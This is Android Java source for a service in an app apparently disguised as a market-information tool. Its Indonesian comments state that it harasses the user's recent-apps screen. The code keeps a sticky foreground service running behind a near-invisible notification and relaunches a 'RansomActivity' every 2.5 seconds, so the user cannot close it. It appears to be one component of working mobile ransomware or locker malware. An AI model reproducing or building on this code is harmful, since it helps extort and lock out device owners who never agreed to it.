package com.informasipasar.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

/**
 * Service ini terus-menerus menempelkan dirinya di recent apps
 * dengan foreground service dan menampilkan activity sesaat.
 * Efeknya: setiap kali user buka recent apps, app kita selalu muncul di paling atas,
 * user jadi susah mencet X karena posisi tombol X terus berubah.
 */
public class RecentGuardService extends Service {

    private static final String CH = "recent_guard";
    private Handler handler;
    private Runnable loop;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(4, baseNotif());
        handler = new Handler(Looper.getMainLooper());
        loop = new Runnable() {
            @Override public void run() {
                try {
                    // Tampilkan activity sesaat untuk mengganggu recent apps
                    Intent i = new Intent(RecentGuardService.this, RansomActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
                            | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                    startActivity(i);
                } catch (Exception ignored) {}
                handler.postDelayed(this, 2500);
            }
        };
        handler.post(loop);
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "Guard", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification baseNotif() {
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("InformasiPasar")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
